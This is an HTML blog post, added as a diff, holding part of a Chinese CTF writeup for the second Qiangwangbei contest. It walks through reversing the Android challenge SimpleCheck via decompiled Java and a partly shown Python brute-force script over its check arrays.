@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
+
+
+
+
+<title>第二届强网杯-QWB-部分Writeup | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/blog/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/blog/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/blog/js/script.js"></script>
+    
+    <script src="/blog/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+
+
+
+  <!-- for theme: default is false -->
+  <!-- for page: default is true -->
+
+<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+	
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/blog/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+			expand_toc()
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">第二届强网杯-QWB-部分Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">三月 26, 2018</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/blog/category/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/20171010114317454.jpg"> &gt;
+一个关注度很高、奖励很丰富的比赛，大佬很多很多 &gt;
+将比赛自己写出的一些题总结一下</p>
+<a id="more"></a>
+<h2 id="前言">前言</h2>
+<p>这次比赛参赛的人一万三，着实吓了一跳，还有很多很多的企业队伍
+但是与我无关，我是来凑热闹2333
+有些题目确实比较有质量，一些大佬队都没拿下一血。也出现了一些web+pwn的新题型(如wechat那个题，简直了)，还有一些无源码的pwn也着实长见识了(pwn方面我学的那点玩意完全用不上)</p>
+<h1 id="reverse">Reverse</h1>
+<h2 id="simplecheck">SimpleCheck</h2>
+<p>这题很眼熟，好像之前在某个比赛见过，一个很简单的逆向
+用dex2jar这个工具将apk中的dex逆向出java代码如下</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">extends</span> c</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span><span class="dt">final</span> Bundle paramBundle<span class="op">)</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#123;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>paramBundle<span class="op">);</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="fu">setContentView</span><span class="op">(</span><span class="dv">2130968603</span><span class="op">);</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    paramBundle <span class="op">=</span> <span class="op">(</span>EditText<span class="op">)</span><span class="fu">findViewById</span><span class="op">(</span><span class="dv">2131427422</span><span class="op">);</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="fu">findViewById</span><span class="op">(</span><span class="dv">2131427423</span><span class="op">).</span><span class="fu">setOnClickListener</span><span class="op">(</span><span class="kw">new</span> <span class="bu">View</span><span class="op">.</span><span class="fu">OnClickListener</span><span class="op">()</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>      <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onClick</span><span class="op">(</span><span class="bu">View</span> paramAnonymousView<span class="op">)</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>      <span class="op">&#123;</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>a<span class="op">.</span><span class="fu">a</span><span class="op">(</span>paramBundle<span class="op">.</span><span class="fu">getText</span><span class="op">().</span><span class="fu">toString</span><span class="op">()))</span><span class="co">/*a.a()函数是关键*/</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">&#123;</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>          Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span>jdField_this<span class="op">,</span> <span class="st">&quot;You get it~&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>          <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">&#125;</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>        Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span>jdField_this<span class="op">,</span> <span class="st">&quot;Sorry its wrong&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>      <span class="op">&#125;</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;);</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#125;</span></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
+<p>很明显<code>a.a()</code>这个函数是关键点，代码如下</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> a</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">private</span> <span class="dt">static</span> <span class="dt">int</span><span class="op">[]</span> a <span class="op">=</span> <span class="op">&#123;</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">146527998</span><span class="op">,</span> <span class="dv">205327308</span><span class="op">,</span> <span class="dv">94243885</span><span class="op">,</span> <span class="dv">138810487</span><span class="op">,</span> <span class="dv">408218567</span><span class="op">,</span> <span class="dv">77866117</span><span class="op">,</span> <span class="dv">71548549</span><span class="op">,</span> <span class="dv">563255818</span><span class="op">,</span> <span class="dv">559010506</span><span class="op">,</span> <span class="dv">449018203</span><span class="op">,</span> <span class="dv">576200653</span><span class="op">,</span> <span class="dv">307283021</span><span class="op">,</span> <span class="dv">467607947</span><span class="op">,</span> <span class="dv">314806739</span><span class="op">,</span> <span class="dv">341420795</span><span class="op">,</span> <span class="dv">341420795</span><span class="op">,</span> <span class="dv">469998524</span><span class="op">,</span> <span class="dv">417733494</span><span class="op">,</span> <span class="dv">342206934</span><span class="op">,</span> <span class="dv">392460324</span><span class="op">,</span> <span class="dv">382290309</span><span class="op">,</span> <span class="dv">185532945</span><span class="op">,</span> <span class="dv">364788505</span><span class="op">,</span> <span class="dv">210058699</span><span class="op">,</span> <span class="dv">198137551</span><span class="op">,</span> <span class="dv">360748557</span><span class="op">,</span> <span class="dv">440064477</span><span class="op">,</span> <span class="dv">319861317</span><span class="op">,</span> <span class="dv">676258995</span><span class="op">,</span> <span class="dv">389214123</span><span class="op">,</span> <span class="dv">829768461</span><span class="op">,</span> <span class="dv">534844356</span><span class="op">,</span> <span class="dv">427514172</span><span class="op">,</span> <span class="dv">864054312</span> <span class="op">&#125;;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">private</span> <span class="dt">static</span> <span class="dt">int</span><span class="op">[]</span> b <span class="op">=</span> <span class="op">&#123;</span> <span class="dv">13710</span><span class="op">,</span> <span class="dv">46393</span><span class="op">,</span> <span class="dv">49151</span><span class="op">,</span> <span class="dv">36900</span><span class="op">,</span> <span class="dv">59564</span><span class="op">,</span> <span class="dv">35883</span><span class="op">,</span> <span class="dv">3517</span><span class="op">,</span> <span class="dv">52957</span><span class="op">,</span> <span class="dv">1509</span><span class="op">,</span> <span class="dv">61207</span><span class="op">,</span> <span class="dv">63274</span><span class="op">,</span> <span class="dv">27694</span><span class="op">,</span> <span class="dv">20932</span><span class="op">,</span> <span class="dv">37997</span><span class="op">,</span> <span class="dv">22069</span><span class="op">,</span> <span class="dv">8438</span><span class="op">,</span> <span class="dv">33995</span><span class="op">,</span> <span class="dv">53298</span><span class="op">,</span> <span class="dv">16908</span><span class="op">,</span> <span class="dv">30902</span><span class="op">,</span> <span class="dv">64602</span><span class="op">,</span> <span class="dv">64028</span><span class="op">,</span> <span class="dv">29629</span><span class="op">,</span> <span class="dv">26537</span><span class="op">,</span> <span class="dv">12026</span><span class="op">,</span> <span class="dv">31610</span><span class="op">,</span> <span class="dv">48639</span><span class="op">,</span> <span class="dv">19968</span><span class="op">,</span> <span class="dv">45654</span><span class="op">,</span> <span class="dv">51972</span><span class="op">,</span> <span class="dv">64956</span><span class="op">,</span> <span class="dv">45293</span><span class="op">,</span> <span class="dv">64752</span><span class="op">,</span> <span class="dv">37108</span> <span class="op">&#125;;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">private</span> <span class="dt">static</span> <span class="dt">int</span><span class="op">[]</span> c <span class="op">=</span> <span class="op">&#123;</span> <span class="dv">38129</span><span class="op">,</span> <span class="dv">57355</span><span class="op">,</span> <span class="dv">22538</span><span class="op">,</span> <span class="dv">47767</span><span class="op">,</span> <span class="dv">8940</span><span class="op">,</span> <span class="dv">4975</span><span class="op">,</span> <span class="dv">27050</span><span class="op">,</span> <span class="dv">56102</span><span class="op">,</span> <span class="dv">21796</span><span class="op">,</span> <span class="dv">41174</span><span class="op">,</span> <span class="dv">63445</span><span class="op">,</span> <span class="dv">53454</span><span class="op">,</span> <span class="dv">28762</span><span class="op">,</span> <span class="dv">59215</span><span class="op">,</span> <span class="dv">16407</span><span class="op">,</span> <span class="dv">64340</span><span class="op">,</span> <span class="dv">37644</span><span class="op">,</span> <span class="dv">59896</span><span class="op">,</span> <span class="dv">41276</span><span class="op">,</span> <span class="dv">25896</span><span class="op">,</span> <span class="dv">27501</span><span class="op">,</span> <span class="dv">38944</span><span class="op">,</span> <span class="dv">37039</span><span class="op">,</span> <span class="dv">38213</span><span class="op">,</span> <span class="dv">61842</span><span class="op">,</span> <span class="dv">43497</span><span class="op">,</span> <span class="dv">9221</span><span class="op">,</span> <span class="dv">9879</span><span class="op">,</span> <span class="dv">14436</span><span class="op">,</span> <span class="dv">60468</span><span class="op">,</span> <span class="dv">19926</span><span class="op">,</span> <span class="dv">47198</span><span class="op">,</span> <span class="dv">8406</span><span class="op">,</span> <span class="dv">64666</span> <span class="op">&#125;;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">private</span> <span class="dt">static</span> <span class="dt">int</span><span class="op">[]</span> d <span class="op">=</span> <span class="op">&#123;</span> <span class="dv">0</span><span class="op">,</span> <span class="op">-</span><span class="dv">341994984</span><span class="op">,</span> <span class="op">-</span><span class="dv">370404060</span><span class="op">,</span> <span class="op">-</span><span class="dv">257581614</span><span class="op">,</span> <span class="op">-</span><span class="dv">494024809</span><span class="op">,</span> <span class="op">-</span><span class="dv">135267265</span><span class="op">,</span> <span class="dv">54930974</span><span class="op">,</span> <span class="op">-</span><span class="dv">155841406</span><span class="op">,</span> <span class="dv">540422378</span><span class="op">,</span> <span class="op">-</span><span class="dv">107286502</span><span class="op">,</span> <span class="op">-</span><span class="dv">128056922</span><span class="op">,</span> <span class="dv">265261633</span><span class="op">,</span> <span class="dv">275964257</span><span class="op">,</span> <span class="dv">119059597</span><span class="op">,</span> <span class="dv">202392013</span><span class="op">,</span> <span class="dv">283676377</span><span class="op">,</span> <span class="dv">126284124</span><span class="op">,</span> <span class="op">-</span><span class="dv">68971076</span><span class="op">,</span> <span class="dv">261217574</span><span class="op">,</span> <span class="dv">197555158</span><span class="op">,</span> <span class="op">-</span><span class="dv">12893337</span><span class="op">,</span> <span class="op">-</span><span class="dv">10293675</span><span class="op">,</span> <span class="dv">93868075</span><span class="op">,</span> <span class="dv">121661845</span><span class="op">,</span> <span class="dv">167461231</span><span class="op">,</span> <span class="dv">123220255</span><span class="op">,</span> <span class="dv">221507</span><span class="op">,</span> <span class="dv">258914772</span><span class="op">,</span> <span class="dv">180963987</span><span class="op">,</span> <span class="dv">107841171</span><span class="op">,</span> <span class="dv">41609001</span><span class="op">,</span> <span class="dv">276531381</span><span class="op">,</span> <span class="dv">169983906</span><span class="op">,</span> <span class="dv">276158562</span> <span class="op">&#125;;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="dt">static</span> <span class="dt">boolean</span> <span class="fu">a</span><span class="op">(</span><span class="bu">String</span> paramString<span class="op">)</span><span class="co">/*传进输入框的String*/</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#123;</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>paramString<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">!=</span> b<span class="op">.</span><span class="fu">length</span><span class="op">)</span> <span class="op">&#123;</span><span class="co">/*长度与b数组等长*/</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span><span class="op">[]</span> arrayOfInt <span class="op">=</span> <span class="kw">new</span> <span class="dt">int</span><span class="op">[</span>a<span class="op">.</span><span class="fu">length</span><span class="op">];</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    arrayOfInt<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>    paramString <span class="op">=</span> paramString<span class="op">.</span><span class="fu">getBytes</span><span class="op">();</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> k <span class="op">=</span> paramString<span class="op">.</span><span class="fu">length</span><span class="op">;</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> j <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span>i <span class="op">&lt;</span> k<span class="op">)</span><span class="co">/*arrayOfInt[0]=0然后后面的数值为传入字符串的拷贝*/</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>      arrayOfInt<span class="op">[</span>j<span class="op">]</span> <span class="op">=</span> paramString<span class="op">[</span>i<span class="op">];</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>      j <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>      i <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(;;)</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>i <span class="op">&gt;=</span> c<span class="op">.</span><span class="fu">length</span><span class="op">)</span> <span class="op">&#123;</span></span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span> label166<span class="op">;</span></span>
+<span id="cb2-30"><a href="#cb2-30" aria-hidden="true" tabindex="-1"></a>      <span class="op">&#125;</span><span class="co">/*检验函数*/</span></span>
+<span id="cb2-31"><a href="#cb2-31" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">((</span>a<span class="op">[</span>i<span class="op">]</span> <span class="op">!=</span> b<span class="op">[</span>i<span class="op">]</span> <span class="op">*</span> arrayOfInt<span class="op">[</span>i<span class="op">]</span> <span class="op">*</span> arrayOfInt<span class="op">[</span>i<span class="op">]</span> <span class="op">+</span> c<span class="op">[</span>i<span class="op">]</span> <span class="op">*</span> arrayOfInt<span class="op">[</span>i<span class="op">]</span> <span class="op">+</span> d<span class="op">[</span>i<span class="op">])</span> <span class="op">||</span> <span class="op">(</span>a<span class="op">[(</span>i <span class="op">+</span> <span class="dv">1</span><span class="op">)]</span> <span class="op">!=</span> b<span class="op">[</span>i<span class="op">]</span> <span class="op">*</span> arrayOfInt<span class="op">[(</span>i <span class="op">+</span> <span class="dv">1</span><span class="op">)]</span> <span class="op">*</span> arrayOfInt<span class="op">[(</span>i <span class="op">+</span> <span class="dv">1</span><span class="op">)]</span> <span class="op">+</span> c<span class="op">[</span>i<span class="op">]</span> <span class="op">*</span> arrayOfInt<span class="op">[(</span>i <span class="op">+</span> <span class="dv">1</span><span class="op">)]</span> <span class="op">+</span> d<span class="op">[</span>i<span class="op">]))</span> <span class="op">&#123;</span></span>
+<span id="cb2-32"><a href="#cb2-32" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb2-33"><a href="#cb2-33" aria-hidden="true" tabindex="-1"></a>      <span class="op">&#125;</span></span>
+<span id="cb2-34"><a href="#cb2-34" aria-hidden="true" tabindex="-1"></a>      i <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-35"><a href="#cb2-35" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
+<span id="cb2-36"><a href="#cb2-36" aria-hidden="true" tabindex="-1"></a>    label166<span class="op">:</span></span>
+<span id="cb2-37"><a href="#cb2-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">true</span><span class="op">;</span></span>
+<span id="cb2-38"><a href="#cb2-38" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#125;</span></span>
+<span id="cb2-39"><a href="#cb2-39" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
+<p>很明显检验函数检查了<code>arrayOfInt[i]</code>与<code>arrayOfInt[i+1]</code>对<code>a、b、c、d</code>数组的关系，其实就是
+<code>a=b*x1^2+c*x1+d &amp;&amp; a=b*x2^2+c*x2+d</code>
+我们至于要这四个数组拿出来然后将输入的数值逐个爆破就成了</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>a <span class="op">=</span> [<span class="dv">0</span>, <span class="dv">146527998</span>, <span class="dv">205327308</span>, <span class="dv">94243885</span>, <span class="dv">138810487</span>, <span class="dv">408218567</span>, <span class="dv">77866117</span>, <span class="dv">71548549</span>, <span class="dv">563255818</span>,</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>     <span class="dv">559010506</span>, <span class="dv">449018203</span>, <span class="dv">576200653</span>, <span class="dv">307283021</span>, <span class="dv">467607947</span>, <span class="dv">314806739</span>, <span class="dv">341420795</span>, <span class="dv">341420795</span>, <span class="dv">469998524</span>,</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>     <span class="dv">417733494</span>, <span class="dv">342206934</span>, <span class="dv">392460324</span>, <span class="dv">382290309</span>, <span class="dv">185532945</span>, <span class="dv">364788505</span>, <span class="dv">210058699</span>, <span class="dv">198137551</span>, <span class="dv">360748557</span>,</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>     <span class="dv">440064477</span>, <span class="dv">319861317</span>, <span class="dv">676258995</span>, <span class="dv">389214123</span>, <span class="dv">829768461</span>, <span class="dv">534844356</span>, <span class="dv">427514172</span>, <span class="dv">864054312</span>]</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>b <span class="op">=</span> [<span class="dv">13710</span>, <span class="dv">46393</span>, <span class="dv">49151</span>, <span class="dv">36900</span>, <span class="dv">59564</span>, <span class="dv">35883</span>, <span class="dv">3517</span>, <span class="dv">52957</span>, <span class="dv">1509</span>, <span class="dv">61207</span>, <span class="dv">63274</span>, <span class="dv">27694</span>, <span class="dv">20932</span>,</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>     <span class="dv">37997</span>, <span class="dv">22069</span>, <span class="dv">8438</span>, <span class="dv">33995</span>, <span class="dv">53298</span>, <span class="dv">16908</span>, <span class="dv">30902</span>, <span class="dv">64602</span>, <span class="dv">64028</span>, <span class="dv">29629</span>, <span class="dv">26537</span>, <span class="dv">12026</span>, <span class="dv">31610</span>, <span class="dv">48639</span>, <span class="dv">19968</span>,</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>     <span class="dv">45654</span>, <span class="dv">51972</span>, <span class="dv">64956</span>, <span class="dv">45293</span>, <span class="dv">64752</span>, <span class="dv">37108</span>]</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>c <span class="op">=</span> [<span class="dv">38129</span>, <span class="dv">57355</span>, <span class="dv">22538</span>, <span class="dv">47767</span>, <span class="dv">8940</span>, <span class="dv">4975</span>, <span class="dv">27050</span>, <span class="dv">56102</span>, <span class="dv">21796</span>, <span class="dv">41174</span>, <span class="dv">63445</span>, <span class="dv">53454</span>, <span class="dv">28762</span>,</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>     <span class="dv">59215</span>, <span class="dv">16407</span>, <span class="dv">64340</span>, <span class="dv">37644</span>, <span class="dv">59896</span>, <span class="dv">41276</span>, <span class="dv">25896</span>, <span class="dv">27501</span>, <span class="dv">38944</span>, <span class="dv">37039</span>, <span class="dv">38213</span>, <span class="dv">61842</span>, <span class="dv">43497</span>, <span class="dv">9221</span>, <span class="dv">9879</span>,</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>     <span class="dv">14436</span>, <span class="dv">60468</span>, <span class="dv">19926</span>, <span class="dv">47198</span>, <span class="dv">8406</span>, <span class="dv">64666</span>]</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>d <span class="op">=</span> [<span class="dv">0</span>, <span class="op">-</span><span class="dv">341994984</span>, <span class="op">-</span><span class="dv">370404060</span>, <span class="op">-</span><span class="dv">257581614</span>, <span class="op">-</span><span class="dv">494024809</span>, <span class="op">-</span><span class="dv">135267265</span>, <span class="dv">54930974</span>, <span class="op">-</span><span class="dv">155841406</span>,</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>     <span class="dv">540422378</span>, <span class="op">-</span><span class="dv">107286502</span>, <span class="op">-</span><span class="dv">128056922</span>, <span class="dv">265261633</span>, <span class="dv">275964257</span>, <span class="dv">119059597</span>, <span class="dv">202392013</span>, <span class="dv">283676377</span>, <span class="dv">126284124</span>,</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>     <span class="op">-</span><span class="dv">68971076</span>, <span class="dv">261217574</span>, <span class="dv">197555158</span>, <span class="op">-</span><span class="dv">12893337</span>, <span class="op">-</span><span class="dv">10293675</span>, <span class="dv">93868075</span>, <span class="dv">121661845</span>, <span class="dv">167461231</span>, <span class="dv">123220255</span>, <span class="dv">221507</span>,</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>     <span class="dv">258914772</span>, <span class="dv">180963987</span>, <span class="dv">107841171</span>, <span class="dv">41609001</span>, <span class="dv">276531381</span>, <span class="dv">169983906</span>, <span class="dv">276158562</span>]</span>
